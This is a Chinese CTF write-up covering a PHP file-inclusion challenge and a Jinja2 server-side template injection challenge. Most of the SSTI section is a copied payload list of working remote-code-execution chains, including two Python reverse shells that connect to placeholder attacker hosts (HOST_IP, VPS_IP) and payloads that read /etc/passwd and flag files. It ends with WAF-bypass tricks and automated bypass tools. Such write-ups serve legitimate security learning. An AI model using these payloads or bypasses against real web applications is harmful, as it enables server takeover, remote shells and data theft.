

# [玄武杯 2025]ez_include

文件包含   PHP伪协议  目录穿越

# 思路

![c008ee78cf.webp](https://www.nssctf.cn/files/2026/11/5/c008ee78cf.webp)

主要是get请求

他对get请求内容进行限制将page的.替换为空格

并且不允许<?和php（限制了`php://`包装器的使用）

他有include而且还是用的我们的page参数

## 过程

可以先尝试读取一下/etc/passwd

发现可以读之后直接尝试/flag可以读到

# [玄武杯 2025]锦家有什么

SSTIJinja2WEB模板注入

![image-20261106112421279](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261106112421279.png)

发先不能跳转

![image-20261106112448289](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261106112448289.png)

查看源代码发现文件路径

![image-20261106112519025](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261106112519025.png)

打开之后让猜参数

用arjun猜一下

**1. Arjun：最常用的独立命令行工具**
Arjun 是目前的首选。它自带一个约 **25,000** 词的精选字典，支持 GET、POST（表单/JSON）和 Header 参数发现。

bash

```
# 基础GET参数发现
arjun -u https://target.com/api/endpoint

# 针对JSON API进行POST参数发现
arjun -u https://target.com/api/endpoint -m JSON

# 使用自定义字典，并设置速率限制以规避WAF
arjun -u https://target.com/page -w params.txt --rate-limit 30
```



它的批量模式（`-i targets.txt`）适合在信息收集阶段对大量URL进行快速筛查

![image-20261106112826489](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20261106112826489.png)

在这里发现有name参数

输入name={{7*7}}回显49证明有模板注入

more和cat都可以查看文件内容，cat被过滤了

#### 通用 payload ( Python3 )[¶](https://hello-ctf.com/hc-web/ssti/#payload-python3)

```
# 命令执行_eval
 {% for x in [].__class__.__base__.__subclasses__() %}
    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'eval' in x.__init__.__globals__['__builtins__']['eval'].__name__ %}
        {{ x.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()') }}
    {% endif %}
{% endfor %}

# 命令执行_os.py
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'os' in x.__init__.__globals__ %}
        {{ x.__init__.__globals__['os'].popen('ls /').read() }}
    {% endif %}
{% endfor %}

# 命令执行_popen
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'popen' in x.__init__.__globals__ %}
        {{ x.__init__.__globals__['popen']('ls /').read() }}
    {% endif %}
{% endfor %}

# 命令执行__frozen_importlib.BuiltinImporter
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if 'BuiltinImporter' in x.__name__ %}
        {{ x["load_module"]("os")["popen"]("ls /").read() }}
    {% endif %}
{% endfor %}

# 命令执行_linecache
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'linecache' in x.__init__.__globals__ %}
        {{ x.__init__.__globals__['linecache']['os'].popen('ls /').read() }}
    {% endif %}
{% endfor %}


# 命令执行_exec(无回显故反弹shell)
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'exec' in x.__init__.__globals__['__builtins__']['exec'].__name__ %}
        {{ x.__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("HOST_IP",Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")')}}
    {% endif %}
{% endfor %}

{{().__class__.__bases__[0].__subclasses__()[216].__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VPS_IP",端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")')}}

# 命令执行_catch_warnings 
{% for x in [].__class__.__base__.__subclasses__() %}{% if 'war' in x.__name__ %}{{ x.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}

# catch_warnings 读取文件
{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__name__=='catch_warnings' %}{{ x.__init__.__globals__['__builtins__'].open('/app/flag', 'r').read() }}{% endif %}{% endfor %}

# _frozen_importlib_external.FileLoader 读取文件
 {% for x in [].__class__.__base__.__subclasses__() %} # {% for x in [].__class__.__bases__[0].__subclasses__() %}
    {% if 'FileLoader' in x.__name__ %}
        {{ x["get_data"](0,"/etc/passwd")}}
    {% endif %}
{% endfor %}

# 其他RCE
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

{{g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()}}

{{url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()}}

{{lipsum.__globals__.__builtins__['__import__']('os').popen('ls').read()}}

{{get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('ls').read()}}

{{application.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}

{{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}

{{cycler.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}

{{joiner.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}

{{namespace.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}

{{url_for.__globals__.current_app.add_url_rule('/1333337',view_func=url_for.__globals__.__builtins__['__import__']('os').popen('ls').read)}}
复制
```

### 🔤 编码绕过：利用解析差异

当WAF基于原始字节或字符进行简单的字符串匹配时，编码可以改变Payload的“外观”。

- **URL编码**：最基础且常用。将整个Payload或其中的敏感字符（如`{` `}` `_`）进行URL编码，例如`{{`变成`%7B%7B`。这能绕过只检查原始URL的浅层规则。
- **Unicode/十六进制/八进制转义**：在Jinja2的字符串上下文中，可以用转义序列来“拼”出被禁的字符。例如，下划线`_`可以被表示为`\x5f`（十六进制）、`\137`（八进制）或`\u005f`（Unicode）。
    - **示例**：`{{ cycler.\x5f\x5finit\x5f\x5f }}`可以绕过对`__init__`的过滤。
- **Base64编码**：将敏感字符串（如`__import__`）进行Base64编码，然后在Payload中通过过滤器解码。例如：`{{ 'X19pbXBvcnRfXw=='|b64decode }}`。

> **注意**：编码绕过的关键在于编码后的数据在到达模板引擎时能被**正确地解码并还原**。如果中间件（如Web框架）先进行了一层解码，而WAF检查的是解码后的内容，那么编码绕过就可能失效。

### 🧩 更强大的绕过思路：从“语法”层面进行规避

当编码被针对，或者WAF会进行归一化处理时，更有效的方法是从Jinja2的语法层面构造等价的Payload，这比单纯的编码更根本。

#### 1. 字符串拼接（绕过子串黑名单）

如果WAF直接匹配`os`、`class`、`flag`等子串，可以在运行时将它们拼接起来，这样原始Payload中就不会出现完整的敏感词。

- **使用 `~` 运算符**：`{{ lipsum["__globals__"]["o"~"s"]["popen"]("cat /flag")["read"]() }}`
- **使用 `+` 运算符**：`{{ ''['__cla' + 'ss__'] }}`
- **使用 `join` 过滤器**：`{{ ['__cla','ss__']|join }}`

#### 2. 使用 `attr()` 过滤器（绕过点号 `.` 或双下划线 `__` 的过滤）

如果WAF拦截了`.`或`__`，`attr()`过滤器可以通过字符串来访问属性，从而完全避开对特定字符的依赖。

- **标准用法**：`{{ ''|attr('__class__') }}`
- **结合字符串拼接**：`{{ ''|attr('__cla'~'ss__') }}`，进一步增强隐蔽性。

#### 3. 使用 `request.args` 传递敏感字符串

如果WAF对用户输入的`name`参数检查极严，可以将恶意字符串放在URL的另一个参数中，然后在模板里通过`request.args`来获取。WAF可能只检查了`name`参数，而忽略了`evil`参数。

- **URL**：`?name={{ request.args.evil }}&evil=__class__`
- 这样，`name`参数在WAF看来是干净的，但模板渲染时，`request.args.evil`会被替换成`__class__`。

#### 4. 使用 `{% set %}` 定义变量

如果`{% %}`语句块没有被过滤，可以用`set`来拼接字符串，这在某些CTF题目中是关键的突破口。

- **示例**：`{% set o='o'~'s' %}{{ lipsum.__globals__[o].popen('id').read() }}`

#### 5. 改用方括号 `[]` 进行属性访问

如果点号`.`被拦截，可以使用字典风格的方括号来访问属性，这在Jinja2中是完全合法的。

- **示例**：`{{ lipsum["__globals__"]["os"]["popen"]("id")["read"]() }}`

### 🛠️ 工具辅助：自动化绕过

在CTF或自动化测试中，可以使用专门工具来应对复杂的WAF绕过。

- **焚靖 (fenjing)**：一个针对Jinja2 SSTI的自动化绕过脚本，集成了大部分CTF中常见的WAF绕过技巧，能自动进行编码和Payload变换。
- **SSTImap**：也内置了丰富的Payload变形和编码选项，可以应对一定程度的WAF过滤。

### 💎 总结

SSTI的WAF绕过是一个**“探测-反馈-调整”**的循环过程。**编码是基础工具，但语法层面的变形（字符串拼接、attr过滤器、替代属性访问）往往更有效、更根本**。

一个实用的策略是**从简到繁**：

1. 首先尝试简单的**URL编码**或**字符串拼接**（`~`或`+`）。
2. 如果无效，再尝试使用`attr()`、`[]`访问、`request.args`等语法变形。
3. 对于复杂的过滤，可以借助**焚靖**等工具进行自动化测试。

